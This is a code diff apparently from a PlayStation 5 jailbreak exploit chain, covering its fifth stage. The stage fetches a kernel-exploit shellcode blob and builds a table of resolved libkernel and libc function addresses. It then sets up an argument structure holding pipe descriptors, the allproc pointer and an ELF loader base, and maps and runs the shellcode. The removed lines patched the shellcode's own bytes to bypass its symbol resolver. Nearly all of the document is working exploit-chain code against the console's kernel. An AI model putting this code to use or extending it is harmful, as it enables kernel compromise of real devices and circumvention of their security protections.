@@ -7788,14 +7788,19 @@ export function makePoopsEngine(X) {
     let binBytes = null;
     let elfBase = null, elfLen = 0, elfMapped = 0;
 
+    // The kexp shellcode is an api-table build (ps5-kexp b12c352): it takes
+    // pre-resolved function addresses via its args extension and performs no
+    // dlsym syscalls itself, so the blob is mapped and run exactly as fetched.
+    const KEXP_BIN_NAME = "kexp-v0.7-b12c352.bin";
+
     flushMark(
       "STAGE5-FETCH-BIN-PRE",
-      "url=../payloads/" + (o.binName || "kexp_2026_05_25.bin"),
+      "url=../payloads/" + KEXP_BIN_NAME,
     );
     try {
       const parts = [];
       const g = await fetchInto(
-        "../payloads/" + (o.binName || "kexp_2026_05_25.bin"),
+        "../payloads/" + KEXP_BIN_NAME,
         (off, chunk) => { parts.push(chunk); },
       );
       binBytes = new Uint8Array(g.total);
@@ -7890,52 +7895,41 @@ export function makePoopsEngine(X) {
     flushMark("STAGE5-ALLPROC",
       "allproc=" + hx(allproc) + "-cached=" + !!ap.cached,);
 
-    const resolverCallA = [0xe8, 0xcf, 0x00, 0x00, 0x00];
-    const resolverCallB = [0xe8, 0x78, 0x01, 0x00, 0x00];
-    const getpidBlock = [
-      0x48, 0x8d, 0x35, 0xac, 0x30, 0x00, 0x00,
-      0x48, 0x8d, 0x55, 0xd0, 0xbf, 0x01, 0x20, 0x00, 0x00,
-      0xe8, 0x41, 0x2b, 0x00, 0x00,
-    ];
-    const bytesAt = (off, expected) =>
-      expected.every((value, index) => binBytes[off + index] === value);
-    const requiredResolverOffsets = [
+    // The shellcode imports 12 libkernel/libc functions. The firmware profile
+    // must carry every offset - the table handed to kexp is built from them.
+    // Order is kexp's fixed KEXP_API_* contract (ps5-kexp include/types.h):
+    // notify, sysctlbyname, pthread_create, pthread_join, getpid (libkernel),
+    // then malloc..vsnprintf (libc).
+    const requiredApiOffsets = [
       PK.LK_NOTIFY, PK.LK_SYSCTLBYNAME, PK.LK_PTHREAD_CREATE,
-      PK.LK_PTHREAD_JOIN, PK.LC_MALLOC, PK.LC_FREE, PK.LC_MEMCPY,
-      PK.LC_MEMSET, PK.LC_STRCMP, PK.LC_MEMCMP, PK.LC_VSNPRINTF,
-      PK.LK_GETPID,
+      PK.LK_PTHREAD_JOIN, PK.LK_GETPID,
+      PK.LC_MALLOC, PK.LC_FREE, PK.LC_MEMCPY, PK.LC_MEMSET,
+      PK.LC_STRCMP, PK.LC_MEMCMP, PK.LC_VSNPRINTF,
     ];
-    if (
-      binBytes.length !== 18912 || !bytesAt(0x1c, resolverCallA) ||
-      !bytesAt(0x23, resolverCallB) || !bytesAt(0x10f1, getpidBlock) ||
-      requiredResolverOffsets.some((off) => off < 0)
-    ) {
-      out.why = "payload resolver bypass signature/profile check failed"; return out;
+    if (requiredApiOffsets.some((off) => off < 0)) {
+      out.why = "firmware profile lacks offsets needed for the kexp api table";
+      return out;
     }
 
-    for (let i = 0; i < 5; ++i) {
-      binBytes[0x1c + i] = 0x90; binBytes[0x23 + i] = 0x90;
-    }
-    const resolvedSlots = [
-      [0x48b0, P.libKernelBase.add32(PK.LK_NOTIFY)], [0x48b8, P.libKernelBase.add32(PK.LK_SYSCTLBYNAME)],
-      [0x48c0, P.libKernelBase.add32(PK.LK_PTHREAD_CREATE)], [0x48c8, P.libKernelBase.add32(PK.LK_PTHREAD_JOIN)],
-      [0x48d0, P.libSceLibcInternalBase.add32(PK.LC_MALLOC)], [0x48d8, P.libSceLibcInternalBase.add32(PK.LC_FREE)],
-      [0x48e0, P.libSceLibcInternalBase.add32(PK.LC_MEMCPY)], [0x48e8, P.libSceLibcInternalBase.add32(PK.LC_MEMSET)],
-      [0x48f0, P.libSceLibcInternalBase.add32(PK.LC_STRCMP)], [0x48f8, P.libSceLibcInternalBase.add32(PK.LC_MEMCMP)],
-      [0x4900, P.libSceLibcInternalBase.add32(PK.LC_VSNPRINTF)],
+    const apiTable = alloc(0x60, "stage5-kexp-api-table");
+    const apiEntries = [
+      P.libKernelBase.add32(PK.LK_NOTIFY),
+      P.libKernelBase.add32(PK.LK_SYSCTLBYNAME),
+      P.libKernelBase.add32(PK.LK_PTHREAD_CREATE),
+      P.libKernelBase.add32(PK.LK_PTHREAD_JOIN),
+      P.libKernelBase.add32(PK.LK_GETPID),
+      P.libSceLibcInternalBase.add32(PK.LC_MALLOC),
+      P.libSceLibcInternalBase.add32(PK.LC_FREE),
+      P.libSceLibcInternalBase.add32(PK.LC_MEMCPY),
+      P.libSceLibcInternalBase.add32(PK.LC_MEMSET),
+      P.libSceLibcInternalBase.add32(PK.LC_STRCMP),
+      P.libSceLibcInternalBase.add32(PK.LC_MEMCMP),
+      P.libSceLibcInternalBase.add32(PK.LC_VSNPRINTF),
     ];
-    for (const [slot, address] of resolvedSlots) w64(binBytes, slot, address);
-
-    const getpidAddress = P.libKernelBase.add32(PK.LK_GETPID);
-    binBytes[0x10f1] = 0x48; binBytes[0x10f2] = 0xb8;
-    w64(binBytes, 0x10f3, getpidAddress);
-    const getpidTail = [0x48, 0x89, 0x45, 0xd0, 0x31, 0xc0];
-    for (let i = 0; i < getpidTail.length; ++i)
-      binBytes[0x10fb + i] = getpidTail[i];
-    for (let i = 0x1101; i < 0x1106; ++i) binBytes[i] = 0x90;
-    flushMark("STAGE5-RESOLVER-BYPASS",
-      "payload=618f4b12-slots=11-getpid=" + hx(getpidAddress) +
-        "-dlsym-syscall-calls-skipped=12",);
+    for (let i = 0; i < apiEntries.length; ++i)
+      w64(apiTable.u8, i * 8, apiEntries[i]);
+    flushMark("STAGE5-API-TABLE",
+      "table=" + hx(apiTable.base) + "-entries=12-dlsym-calls=0",);
 
     const size = binBytes.length;
     const aligned = (size + PK.PAGE - 1) & ~(PK.PAGE - 1);
@@ -8044,15 +8038,20 @@ export function makePoopsEngine(X) {
     flushMark("STAGE5-PTHREAD", "libkernel=" + hx(lkb) +
       "-create=" + hx(tc.addr) + "-join=" + hx(tj.addr),);
 
-    const args = alloc(0x28, "stage5-shellcode-args");
+    // args layout (kexp payload_args_t, 0x38 bytes): 0x00-0x27 legacy prefix,
+    // then the v2 api-table extension - magic 'KXP2' @0x28, count @0x2c,
+    // table pointer @0x30. The table itself was built above.
+    const args = alloc(0x38, "stage5-shellcode-args");
     w32(args.u8, 0x00, S.masterRfd); w32(args.u8, 0x04, S.masterWfd);
     w32(args.u8, 0x08, S.victimRfd); w32(args.u8, 0x0c, S.victimWfd);
     w64(args.u8, 0x10, allproc); w64(args.u8, 0x18, elfBase);
     w64(args.u8, 0x20, i64(elfLen, 0));
+    w32(args.u8, 0x28, 0x4b585032); w32(args.u8, 0x2c, apiEntries.length);
+    w64(args.u8, 0x30, apiTable.base);
     flushMark("STAGE5-ARGS", "master=" + S.masterRfd + "." + S.masterWfd +
       "-victim=" + S.victimRfd + "." + S.victimWfd +
       "-allproc=" + hx(allproc) + "-elfldr=" + hx(elfBase) + "-size=0x" +
-      elfLen.toString(16),);
+      elfLen.toString(16) + "-apiTable=" + hx(apiTable.base),);
 
     if (o.dryRun) {
       out.ok = true; out.ran = false;
